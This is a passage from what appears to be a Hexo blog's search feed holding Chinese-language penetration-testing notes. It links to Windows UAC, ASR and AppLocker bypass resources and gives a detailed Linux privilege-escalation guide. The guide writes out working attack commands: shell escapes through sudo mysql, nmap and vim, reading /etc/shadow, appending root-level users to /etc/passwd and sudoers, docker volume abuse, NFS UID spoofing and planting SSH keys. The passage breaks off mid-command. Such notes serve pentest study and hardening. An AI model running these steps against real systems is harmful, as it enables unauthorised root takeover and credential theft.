      <tag>常见杀软检测技术及方法</tag>
      
      <tag>msf三种免杀方法</tag>
      
      <tag>veil</tag>
      
      <tag>venom</tag>
      
      <tag>hacktheworld</tag>
      
      <tag>shellter</tag>
      
      <tag>the-backdoor-factory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bypass</title>
    <link href="/2020/10/02/bypass/"/>
    <url>/2020/10/02/bypass/</url>
    
    <content type="html"><![CDATA[<h2 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1.bypassuac"></a>1.bypassuac</h2><h3 id="1-msf-bypassuac"><a href="#1-msf-bypassuac" class="headerlink" title="1.msf bypassuac"></a>1.msf bypassuac</h3><p>之前已经做过总结：<a href="https://ahiahiahiahia.github.io/2020/10/01/windows%E6%8F%90%E6%9D%83/">https://ahiahiahiahia.github.io/2020/10/01/windows%E6%8F%90%E6%9D%83/</a></p><h3 id="2-UACME"><a href="#2-UACME" class="headerlink" title="2.UACME"></a>2.UACME</h3><p>项目地址：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>这是一个很大的项目，很实用，里面有很多文章，随便举一个</p><p><strong>Nishang中的Invoke-PsUACme.ps1</strong></p><p><a href="https://blog.csdn.net/xiaoi123/article/details/86292165">https://blog.csdn.net/xiaoi123/article/details/86292165</a></p><h3 id="3-CVE-2019-1388：Windows-UAC-本地提权"><a href="#3-CVE-2019-1388：Windows-UAC-本地提权" class="headerlink" title="3.CVE-2019-1388：Windows UAC 本地提权"></a>3.CVE-2019-1388：Windows UAC 本地提权</h3><p>参考一下，以后复现。。。<a href="https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w">https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w</a></p><h3 id="4-ComputerDefaults-exe"><a href="#4-ComputerDefaults-exe" class="headerlink" title="4.ComputerDefaults.exe"></a>4.ComputerDefaults.exe</h3><p>老规矩，自己看。。。<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA</a> 或者 <a href="https://blog.csdn.net/qq_36119192/article/details/104292591?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_36119192/article/details/104292591?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</a></p><h2 id="2-bypassASR"><a href="#2-bypassASR" class="headerlink" title="2.bypassASR"></a>2.bypassASR</h2><p><a href="https://lengjibo.github.io/asr/">https://lengjibo.github.io/asr/</a></p><p>创建进程、wmi创建进程、office创建子进程、wmi和psexec调用</p><h2 id="3-bypassApplocker"><a href="#3-bypassApplocker" class="headerlink" title="3.bypassApplocker"></a>3.bypassApplocker</h2><p><a href="https://lengjibo.github.io/appbypass/">https://lengjibo.github.io/appbypass/</a></p><p>msbuild.exe、mshta.exe、msiexec、regsvr32.exe、rundll32.exe</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypassuac</tag>
      
      <tag>bypassASR</tag>
      
      <tag>bypassApplocker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux提权(user-&gt;root)</title>
    <link href="/2020/10/01/linux%E6%8F%90%E6%9D%83-user-root/"/>
    <url>/2020/10/01/linux%E6%8F%90%E6%9D%83-user-root/</url>
    
    <content type="html"><![CDATA[<p>当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。</p><a id="more"></a><p><strong>Linux提权的前提：</strong></p><ul><li>拿到了一个低权限的账号</li><li>能上传和下载文件</li><li>机器上有python、java、perl等环境（非必须项）</li></ul><h2 id="1-密码相关操作"><a href="#1-密码相关操作" class="headerlink" title="1.密码相关操作"></a>1.密码相关操作</h2><p><strong>1.查找带有密码相关的文件</strong></p><p><code>grep --color=auto -rnw &#39;/&#39; -ie  &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</code></p><p><strong>2.查看过期的密码</strong></p><p><code>cat /etc/security/opasswd</code></p><p><code>id</code>：查看权限</p><p><strong>3.查看用户最后编辑的文件</strong></p><p><code>find / -mmin -10 2&gt;/dev/null |grep -Ev &quot;^/proc&quot;</code></p><p><strong>4.查看内存中密码</strong></p><p>一些服务的密码可能存在内存中：<code>strings /dev/mem -n10 | grep -i pass</code></p><p><strong>5.查找敏感文件</strong></p><p>查找带有password的文件：<code>locate password | more</code></p><h2 id="2-计划任务cron"><a href="#2-计划任务cron" class="headerlink" title="2.计划任务cron"></a>2.计划任务cron</h2><p>查看计划任务：<code>cat /var/log/cronlog</code></p><p>编辑计划任务：<code>/etc/crontab</code></p><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出,默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p><p><code>ls -l /etc/cron.[d]|[daily]|[hourly]|[monthly]|[weekly]</code></p><p>使用该命令，列出的文件，查看这四个文件夹内的文件，查看是否允许其他用户修改。如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p><h2 id="3-内核漏洞：exp"><a href="#3-内核漏洞：exp" class="headerlink" title="3.内核漏洞：exp"></a>3.内核漏洞：exp</h2><p>查看linux的发行版本</p><pre><code class="hljs shell">cat /etc/issue  (Debian，ubuntu系列)cat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release (红帽，centos系列)</code></pre><p>查看Linux内核版本</p><pre><code class="hljs shell">cat /proc/versionuname -auname -mrsrpm -q kernel  （查询kernel rpm包，不推荐用，一个系统可以拥有多个版本包）dmesg |grep linuxls /boot |grep vmlinuz</code></pre><p><code>dpkg -l</code>：查看已经安装的程序</p><p>提权：</p><p>1.可以用kali自searchsploit来搜索exploitdb中的漏洞利用代码<code>searchsploit linux Debian 版本</code></p><p>2.通过现有的exp上传到目标主机，执行exp，获得shell权限：<a href="https://github.com/SecWiki/linux-kernel-exploits%EF%BC%88%E6%9C%AC%E6%9D%A1%E5%8F%AF%E4%BB%A5%E5%92%8C%E4%B8%8B%E9%9D%A2%E4%B8%80%E6%9D%A1%E7%BB%93%E5%90%88%E4%BD%BF%E7%94%A8%EF%BC%89">https://github.com/SecWiki/linux-kernel-exploits（本条可以和下面一条结合使用）</a></p><p>3.工具：linux-exploit-suggester，可以识别当前系统的内核版本以及架构并且尝试查找可以利用的exp</p><pre><code class="hljs shell">haha@haha-virtual-machine:~/linux-exploit-suggester-master$ ./linux-exploit-suggester.shAvailable information:Kernel version: 4.15.0Architecture: x86_64Distribution: ubuntuDistribution version: 16.04Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performedPackage listing: from current OSSearching among:74 kernel space exploits45 user space exploitsPossible Exploits:[+] [CVE-2019-18634] sudo pwfeedback   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/   Exposure: less probable   Tags: mint=19   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c   Comments: sudo configuration requires pwfeedback to be enabled.[+] [CVE-2019-15666] XFRM_UAF   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc   Exposure: less probable   Download URL:    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled[+] [CVE-2018-1000001] RationalLove   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/   Exposure: less probable   Tags: debian=9&#123;libc6:2.24-11+deb9u1&#125;,ubuntu=16.04.3&#123;libc6:2.23-0ubuntu9&#125;   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c   Comments: kernel.unprivileged_userns_clone=1 required[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt   Exposure: less probable   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries</code></pre><p>Linux_Exploit_Suggester同上类似</p><p>Linux本地提权漏洞复现与检测思路：<a href="https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA">https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA</a></p><p>其他内核提权</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><h2 id="4-利用root权限运行的服务提权"><a href="#4-利用root权限运行的服务提权" class="headerlink" title="4.利用root权限运行的服务提权"></a>4.利用root权限运行的服务提权</h2><p>如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。</p><p>可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。</p><p><code>netstat -antup </code>显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被利用。</p><p><code>ps aux </code>列出哪些进程正在运行</p><p><code>ps -aux | grep root </code>列出以root身份运行的服务。</p><p>例如mysql以root运行，则mysql执行的命令将以root运行，可以参考：<a href="https://www.jb51.net/article/51767.htm">https://www.jb51.net/article/51767.htm</a></p><h2 id="5-sudo提权"><a href="#5-sudo提权" class="headerlink" title="5.sudo提权"></a>5.sudo提权</h2><p>在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用<strong>sudo</strong>可以升级特权。</p><h3 id="1-sudo基本知识"><a href="#1-sudo基本知识" class="headerlink" title="1.sudo基本知识"></a>1.sudo基本知识</h3><h4 id="1-什么是sudo"><a href="#1-什么是sudo" class="headerlink" title="1.什么是sudo"></a>1.什么是sudo</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><p>它的特性主要有这样几点：</p><ul><li>sudo能够限制用户只在某台主机上运行某些命令。</li><li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li><li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li><li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。</li></ul><p>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p><p>sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。</p><p>由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。</p><p>参数说明：</p><ul><li><p>-V 显示版本编号</p></li><li><p>-h 会显示版本编号及指令的使用方式说明</p></li><li><p>-l 显示出自己（执行 sudo 的使用者）的权限</p></li><li><p>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</p></li><li><p>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</p></li><li><p>-b 将要执行的指令放在背景执行</p></li><li><p>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</p></li><li><p>-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</p></li><li><p>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</p></li><li><p>-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</p></li><li><p>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</p></li></ul><h4 id="2-sudoer文件"><a href="#2-sudoer文件" class="headerlink" title="2.sudoer文件"></a>2.sudoer文件</h4><p><strong>sudoers文件主要有三部分组成：</strong></p><ul><li>sudoers的默认配置（default），主要设置sudo的一些缺省值</li><li>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。</li><li>安全策略（规则定义）——<strong>重点</strong>。</li></ul><p><strong>语法</strong></p><p>root ALL=(ALL) ALL</p><p>说明1：root用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p><p>第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。sudo</p><p>touhid ALL= /sbin/poweroff</p><p>说明2：以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</p><p>touhid ALL = (root) NOPASSWD: /usr/bin/find</p><p>说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p><h3 id="2-利用sudo来提权"><a href="#2-利用sudo来提权" class="headerlink" title="2.利用sudo来提权"></a>2.利用sudo来提权</h3><h4 id="1-利用服务或者命令来提权"><a href="#1-利用服务或者命令来提权" class="headerlink" title="1.利用服务或者命令来提权"></a>1.利用服务或者命令来提权</h4><p><code>sudo -l</code>：显示当前用户所支持的命令、服务，变相的查询当前的权限</p><p><strong>一般滥用sudo命令进行提权的有</strong>：/usr/bin/find、nano、vim、man、awk、less、more、namp、wget</p><p>可以参考<a href="http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/">http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/</a>     <a href="https://cloud.tencent.com/developer/article/1708368">https://cloud.tencent.com/developer/article/1708368</a></p><p><strong>一般滥用sudo服务进行提权的有</strong>：msql、apache2</p><p><strong>mysql</strong>：<code>sudo mysql -e &#39;\! /bin/sh&#39;</code></p><p><strong>apache2</strong>：</p><p>使用它我们可以查看系统文件。</p><p><code>sudo apache2 -f / etc / shadow</code></p><p>输出是这样的：</p><p><code>Syntax error on line 1 of /etc/shadow:Invalid command &#39;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::&#39;, perhaps misspelled or defined by a module not included in the server configuration</code></p><p>没有shell，但是我们可以现在提取root哈希，然后再破解哈希。</p><h4 id="2-模拟虚拟终端提权"><a href="#2-模拟虚拟终端提权" class="headerlink" title="2.模拟虚拟终端提权"></a>2.模拟虚拟终端提权</h4><p>有了（疑似）root密码怎么办？可ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。可利用低权shell，找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p><p>python可，在shell里面输入：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p><pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;<span class="hljs-meta">$</span><span class="bash"> sudo su</span>sudo su[sudo] password for www-data: 123456Sorry, try again.[sudo] password for www-data:</code></pre><h4 id="3-漏洞提权-CVE-2019-14287"><a href="#3-漏洞提权-CVE-2019-14287" class="headerlink" title="3.漏洞提权-CVE-2019-14287"></a>3.漏洞提权-CVE-2019-14287</h4><p>关于此漏洞，有一丢丢鸡肋，因为要修改/etc/sudoers，但是不一定有权限修改此文件。。。可以做一个预留后门，后期使普通账户拥有最高权限。<a href="https://www.cnblogs.com/sstfy/p/11695967.html">https://www.cnblogs.com/sstfy/p/11695967.html</a></p><h2 id="6-suid提权"><a href="#6-suid提权" class="headerlink" title="6.suid提权"></a>6.suid提权</h2><p>suid，代表执行时设置的用户id,为文件附上这样的权限命令：chmod u+s 或者 chmod 4755</p><p>查看正在系统上运行的所有SUID可执行文件的三条命令（这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。）：</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>      or</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>            or</p><p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></p><p>但并不是具有suid权限的文件均可以用来提权，常见的可以用suid提权:</p><p>1.nmap：version(2.02–5.21)带有交互模式，允许用户执行shell命令， 可使用交互式控制台来运行具有相同权限的shell：</p><pre><code class="hljs isbl"><span class="hljs-variable">nmap</span> -<span class="hljs-function"><span class="hljs-title">v</span>(查看版本)</span><span class="hljs-variable">nmap</span> -<span class="hljs-function"><span class="hljs-title">interactive</span>(启动交互模式)</span><span class="hljs-variable">nmap</span>&gt;<span class="hljs-variable">!sh</span>(此命令将会得到一个提权后的<span class="hljs-variable">shell</span>)</code></pre><p>vim：<code>vim -c &#39;!sh&#39;</code></p><p>另外还有find、bash、more、less、nano、cp等，具体参考：<a href="https://www.freebuf.com/articles/system/149118.html">https://www.freebuf.com/articles/system/149118.html</a></p><p>GTFOBins：一个开源项目，记录了Linux下常见的可用来提权的列表以及如何使用：<a href="https://gtfobins.github.io/%EF%BC%8C%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%EF%BC%9Ahttps://blog.csdn.net/weixin_44214107/article/details/103537647">https://gtfobins.github.io/，具体使用可以参考：https://blog.csdn.net/weixin_44214107/article/details/103537647</a></p><h2 id="7-利用可写文件提权"><a href="#7-利用可写文件提权" class="headerlink" title="7.利用可写文件提权"></a>7.利用可写文件提权</h2><p>大多数linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p><p>有关/etc/passwd 文件里面数据的每个属性，可以参考：<a href="https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF</a></p><h3 id="1-读取-替换hash"><a href="#1-读取-替换hash" class="headerlink" title="1.读取/替换hash"></a>1.读取/替换hash</h3><p>典型的etc/passwd文件</p><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span>0<span class="hljs-symbol">:</span>0<span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1:1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/bin/sh</span></code></pre><p>passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hash</p><p>典型etc/shadow文件</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$URgq<span class="hljs-number">7</span>sJf$<span class="hljs-number">4</span>x<span class="hljs-number">8</span>e<span class="hljs-number">9</span>ntqTwAPIubi<span class="hljs-number">9</span>YLxLQ<span class="hljs-number">2</span>mZTTZKnGz<span class="hljs-number">0</span>g/wWzOdPB<span class="hljs-number">5</span>eGuz.S<span class="hljs-number">5</span>iRtFdvfFd<span class="hljs-number">9</span>VIVEWouiodB/hh<span class="hljs-number">9</span>BYOLgAD<span class="hljs-number">8</span>u<span class="hljs-number">5</span>/:<span class="hljs-number">16902</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">15730</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::</code></pre><p>如果passwd可写，我们就可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解。</p><h3 id="2-写入新用户"><a href="#2-写入新用户" class="headerlink" title="2.写入新用户"></a>2.写入新用户</h3><p>管理员设置不规范，导致一些文件可写</p><p><code>/etc/passwd</code>可读写，例如写入一个新用户：<code>echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</code>,账户：test，密码：password@123</p><p><code>/etc/sudoers</code>可写,例如写一个新用户可用sudo执行任何命令：<code>echo &quot;用户名 ALL=(ALL:ALL)ALL&quot;&gt;&gt;/etc/sudoers</code></p><h2 id="8-敏感组提权（docker）"><a href="#8-敏感组提权（docker）" class="headerlink" title="8.敏感组提权（docker）"></a>8.敏感组提权（docker）</h2><p>docker安装之后会有一个docker组，以root权限运行，若权限设置不是很规范，可以利用其搭建一个shell，但是现在docker安装默认权限很低，用处不大~</p><p>下面分享一种docker提权方法，看看就行了别当真，前提是已经拥有docker权限的用户unknower(没有就无解~)</p><p>远程ssh登录：<code>ssh unknower@target-ip</code></p><p>运行以下命令，将目标机的目录(任何你想要的目录)加载到docker镜像来：<code>docker run -v 你想要的目录:/mnt -it alpine </code></p><p>​    解释：此命令会到Docker Hub仓库的alpine镜像拉取回来，接着将其运行起来。-v：新建一个磁盘卷给这个docker实例(将目标机你想要的目录映射到docker的/mnt目录)。-it：命令运行后进入交互式界面，而不是让这个实例在后台运行。</p><p>咱可以将/etc/passwd 、etc/shadow或者/root/authorized_keys映射金/mnt中，将/etc/passwd中的hash搞出来解个密，但希望不大，准备白干哈哈，还不如自己写一个root用户进去：</p><p>openssl指定salt使用MD5加密生成一个密码：<code>openssl passwd -1 -salt test</code></p><p>将其写入到passwd中：<code>echo &#39;test:生成的密码:0:0::/root:/bin/bash&#39; &gt;&gt;passwd</code></p><p>再使用ssh就可以登录目标机了~</p><p>然并卵~</p><h2 id="9-劫持环境变量提权"><a href="#9-劫持环境变量提权" class="headerlink" title="9.劫持环境变量提权"></a>9.劫持环境变量提权</h2><p><a href="https://www.webshell.cc/5211.html">https://www.webshell.cc/5211.html</a></p><h2 id="10-网络与隐藏的服务提权"><a href="#10-网络与隐藏的服务提权" class="headerlink" title="10.网络与隐藏的服务提权"></a>10.网络与隐藏的服务提权</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程root漏洞。</p><p><code>netstat -antup</code>可查看各种网络服务</p><p>如若找到一些特别的服务，可以nc等做一个端口转发用来提权。</p><h2 id="11-通配符注入"><a href="#11-通配符注入" class="headerlink" title="11.通配符注入"></a>11.通配符注入</h2><p><a href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p><h2 id="12-NFS弱权限提权"><a href="#12-NFS弱权限提权" class="headerlink" title="12.NFS弱权限提权"></a>12.NFS弱权限提权</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><h3 id="1-查看目标是否开启nfs服务"><a href="#1-查看目标是否开启nfs服务" class="headerlink" title="1.查看目标是否开启nfs服务"></a>1.查看目标是否开启nfs服务</h3><p>NFS服务的默认开放端口为2049/TCP，可以借助Nmap探测目标主机是否开启nfs服务：<code>nmap -p2049 target-ip</code></p><p>也可以通过rpcinfo命令来确定主机上是否运行或挂载了NFS服务：<code>rpcinfo -p target-ip</code></p><h3 id="2-列出目标的导出文件夹列表"><a href="#2-列出目标的导出文件夹列表" class="headerlink" title="2.列出目标的导出文件夹列表"></a>2.列出目标的导出文件夹列表</h3><p><strong>showmount</strong></p><p>显示出导出文件夹列表：<code>showmount -e target-ip</code></p><p>显示指定NFS服务器连接NFS客户端的信息：<code>showmount target-ip </code></p><p>显示被挂挂载的共享目录：<code>showmount -d target-ip </code></p><p>显示挂载点信息和共享目录：<code>showmount -a target-ip </code></p><p><strong>msf</strong></p><p>msf也有相应的模块也可列出导出文件夹：<code>auxiliary/scanner/nfs/nfsmount</code></p><p><strong>nfsshell</strong></p><p>小工具：<a href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a> 可以连接到NFS共享并可以帮助我们手动识别一些常见的安全问题</p><p>安装：</p><pre><code class="hljs shell">apt-get install libreadline-dev libncurses5-devmakegcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses./nfsshell</code></pre><p>获取导出文件夹列表</p><pre><code class="hljs shell"><span class="hljs-meta">nfs&gt;</span><span class="bash"> host target-ip // 连接NFS服务</span><span class="hljs-meta">nfs&gt;</span><span class="bash"> <span class="hljs-built_in">export</span> // 导出NFS列表</span></code></pre><h3 id="3-访问nfs共享文件夹"><a href="#3-访问nfs共享文件夹" class="headerlink" title="3.访问nfs共享文件夹"></a>3.访问nfs共享文件夹</h3><p>导出的文件夹可以通过创建一个空的本地文件夹，并将共享挂载到该文件夹来访问，如下所示：</p><pre><code class="hljs shell">root@kali:mkdir /temp/root@kali:mount -t nfs target-ip:/ /temp -o nolock</code></pre><p>当成功验证共享挂载后，列出本地的所有磁盘信息</p><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:df</span> -h</code></pre><p>此时，我们可以像访问其他文件夹一样访问共享文件夹。很多企业和组织不止一次的使用不正确的权限配置将everyone’s 的home目录备份到NFS的共享目录下。或许可以发现宝~</p><pre><code class="hljs shell">root@kali：cd /temproot@kali:/temp# ls...此地就不列出具体信息</code></pre><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><pre><code class="hljs shell">root@kali:/temp# lspassword.txtroot@kali:/temp# cat password.txtcat:password.txt:Permission deniedroot@kali:/temp#</code></pre><p>对上述文件没有读取权限？可伪造文件所有者的UID欺骗nfs服务器</p><p>查看文件所有者的名字和文件所有者的UID（用户ID）和GUID（组ID）:<code>ls -al</code>    <code>id</code></p><p>then 在本地创建一个新用户，并将该用户的UID和名称修改为文件所有者相同的</p><pre><code class="hljs shell">root@kali:useradd &lt;name&gt;  #创建一个用户root@kali:passwd &lt;name&gt;  #为该用户设置密码</code></pre><p>UID可以在passwd文件中更改：<code>vi /etc/passwd</code></p><p>从挂载的文件夹执行su命令，并使用之前创建的已知密码，此时当前用户将会被切换到新用户。</p><pre><code class="hljs shell">root@kali:/temp# su &lt;name&gt;Password:</code></pre><p>由于该文件的UID与新用户的UID相同，因此系统会误认为这是文件权限的所有者，这样我们就可以以一个合法的用户身份来读取文件的内容了。</p><p>之所以造成这种问题，原因在于导出文件夹并未设置root_squash选项。root_squash登入NFS主机，使用该共享目录时相当于该目录的拥有者。但是如果是以root身份使用这个共享目录的时候，那么这个使用者（root）的权限将被压缩成为匿名使用者，即通常他的UID与GID都会变成nobody（root_sqaush参数阻止对连接到NFS卷的远程root用户具有root访问权限，远程根用户在连接时会分配一个用户“ nfsnobody ”，它具有最少的本地特权。如果 no_<em>root_squash</em> 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ <em>root_squash</em> ”参数。）那个身份，以防止越权访问。</p><p>可以在以下位置启用或禁用root_squash选项：<code>vi /etc/exports</code></p><pre><code class="hljs shell">/home 192.168.1.47(root_squash) // Enables Root Squash/home 192.168.1.47(no_root_squash) // Disables Root Squash</code></pre><p>如果/etc/passwd文件在里面且具有写入权限，那么我们可以通过将一些非特权用户的UID更改为0，使其具有根级别的访问权限。从下图中可以看到，我将service用户的UID修改为了0，此时该用户将具备root的访问权限。</p><p>通过SSH连接命令再次与目标服务器建立连接，service将获取到一个root访问权限。<code>ssh service@target-ip</code></p><h3 id="5-进一步提权"><a href="#5-进一步提权" class="headerlink" title="5.进一步提权"></a>5.进一步提权</h3><p>根据存储在导出文件夹中的文件，可能可以通过SSH或RSH和Rlogin来获取到shell访问权限。 我们着重来关注以下两个文件：</p><pre><code class="hljs shell">authorized_keysrhosts</code></pre><p>这两个文件都隐藏在NFS文件夹中，我们可以利用以下命令来确定这些文件的存在:<code>ls -al</code></p><p>生成一个SSH密钥对并将其公钥添加到授权密钥列表中，那样我们就可以通过NFS服务器上的SSH与其建立连接了。</p><pre><code class="hljs shell">root@kali:cd /root/.ssh/ssh-keygen -t rsa -b 4096cp /root/.ssh/id_rsa.pub /temp/root/.ssh/cat 